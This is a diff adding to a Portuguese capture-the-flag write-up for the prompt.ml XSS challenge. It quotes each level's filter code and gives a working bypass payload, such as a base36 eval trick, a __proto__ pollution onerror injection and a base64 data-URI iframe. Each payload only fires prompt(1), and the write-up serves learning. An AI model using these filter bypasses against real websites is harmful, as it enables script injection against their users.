@@ -324,15 +324,99 @@ Porém, ele não impede o uso de operadores, como o `in` por exemplo. Sendo assi
 
 Aqui está o enunciado do nível C:
 
+```
+function escape(input) {
+    // in Soviet Russia...
+    input = encodeURIComponent(input).replace(/'/g, '');
+    // table flips you!
+    input = input.replace(/prompt/g, 'alert');
 
+    // ノ┬─┬ノ ︵ ( \o°o)\
+    return '<script>' + input + '</script> ';
+}        
+```
 
+Esse código tenta evitar a inserção de prompt, alterando por alert. Porém, outros números e funções são permitidos, o que tem como contornar utilizando a função [eval](https://developer.mozilla.org/pt-BR/docs/Web/JavaScript/Reference/Global_Objects/eval). Para isso, utilizamos o seguinte payload:
 
-> `hkcert24{***REDACTED***}`
+`eval(1558153217..toString(36))(1)`
 
+Esse número está em `base36`, e após converter tudo, se transforma em `prompt(1)`
 
+[![Print13.png](https://i.postimg.cc/wxRFw3cz/Print13.png)](https://postimg.cc/V51j6fVZ)
 
+### Level D
 
-### Level 4
+Aqui está o enunciado do nível D:
+
+```
+ function escape(input) {
+    // extend method from Underscore library
+    // _.extend(destination, *sources) 
+    function extend(obj) {
+        var source, prop;
+        for (var i = 1, length = arguments.length; i < length; i++) {
+            source = arguments[i];
+            for (prop in source) {
+                obj[prop] = source[prop];
+            }
+        }
+        return obj;
+    }
+    // a simple picture plugin
+    try {
+        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
+        var data = JSON.parse(input);
+        var config = extend({
+            // default image source
+            source: 'http://placehold.it/350x150'
+        }, JSON.parse(input));
+        // forbit invalid image source
+        if (/[^\w:\/.]/.test(config.source)) {
+            delete config.source;
+        }
+        // purify the source by stripping off "
+        var source = config.source.replace(/"/g, '');
+        // insert the content using mustache-ish template
+        return '<img src="{{source}}">'.replace('{{source}}', source);
+    } catch (e) {
+        return 'Invalid image data.';
+    }
+}        
+```
+
+Nesse nível, o código manipula objetos JSON, a fim de gerar uma imagem com o link inserido. Porém, a vulnerabilidade se encontra na maneira que o objeto proto é manipulado. Nesse caso, ele permite que seja inserida a função onerror, permitindo assim que o código execute a função prompt(1). Para isso, utilizaremos o seguinte payload:
+
+`{"source":{},"__proto__":{"source":"$``onerror=prompt(1)>"}}`
+
+[![Print14.png](https://i.postimg.cc/X70KxLYK/Print14.png)](https://postimg.cc/BtM1nxDt)
+
+### Level F
+
+Aqui está o enunciado do nível F:
+
+```
+function escape(input) {
+    // sort of spoiler of level 7
+    input = input.replace(/\*/g, '');
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+
+    return segments.map(function(title, index) {
+        // title can only contain 15 characters
+        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
+    }).join('\n');
+}        
+```
+
+Nesse nível, ele divide cada segmento utilizando o caractere `#`. Além disso, limita a apenas 15 caracteres. A solução desenvolvida foi a seguinte:
+
+`"><script>``#${prompt(1)}#`</script>`
+
+Nesse código, ele insere normalmente o código, porém utilizando `#` para contornar a limitação de 15 caracteres.
+
+[![Print15.png](https://i.postimg.cc/FHHLnB5S/Print15.png)](https://postimg.cc/rK7sDgpy)
+
+### Level 4 (Non-solved)
 
 Aqui está o enunciado do nível 4:
 
@@ -349,3 +433,35 @@ function escape(input) {
     }
 }        
 ```
+
+Esse exercício está incompleto, pois para resolvê-lo precisaremos inserir informações que correspondam ao URL: https://prompt.ml/js/test.js. Uma solução possível é inserir alguma URL maliciosa, seja ela codificada ou que corresponda exatamente a limitação.
+
+### Level E (Limited)
+
+Aqui está o enunciado do nível E:
+
+```
+function escape(input) {
+    // I expect this one will have other solutions, so be creative :)
+    // mspaint makes all file names in all-caps :(
+    // too lazy to convert them back in lower case
+    // sample input: prompt.jpg => PROMPT.JPG
+    input = input.toUpperCase();
+    // only allows images loaded from own host or data URI scheme
+    input = input.replace(/\/\/|\w+:/g, 'data:');
+    // miscellaneous filtering
+    input = input.replace(/[\\&+%\s]|vbs/gi, '_');
+
+    return '<img src="' + input + '">';
+}        
+```
+
+Nesse nível, o código tenta criar uma tag com a url fornecida. Além disso, ele transforma todos os caracteres em letras maiúsculas e realiza algumas substituições, como `//` por `data`: por exemplo. O problema dessa questão, está no fato de que o navegador utilizado seja compatível com a URI `,data:`, impossibilitando que seja executado na maioria. Utilizei o Firefox para resolver, e o seguinte payload:
+
+`"><IFRAME SRC="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4="`
+
+O valor convertido em base64, corresponde a função `prompt(1)`
+
+[![Print16.png](https://i.postimg.cc/gjpwyMHn/Print16.png)](https://postimg.cc/ftHTDfFN)
+
+
